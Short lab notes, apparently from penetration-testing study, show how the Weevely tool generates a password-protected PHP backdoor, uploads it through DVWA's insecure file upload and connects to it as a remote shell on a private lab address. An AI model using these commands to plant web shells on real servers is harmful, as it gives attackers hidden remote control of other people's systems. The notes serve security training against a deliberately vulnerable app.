# Weevely

1. Create backdoor in Kali
   - ```weevely generate 123456 /root/shell.php```
2. Upload in vulnerable app (DVWA-Low)
3. Run the path
   - *http://192.168.152.132/dvwa/hackable/uploads/shell.php*
4. Connect to shell from Kali
   - ```weevely http://192.168.152.132/dvwa/hackable/uploads/shell.php```
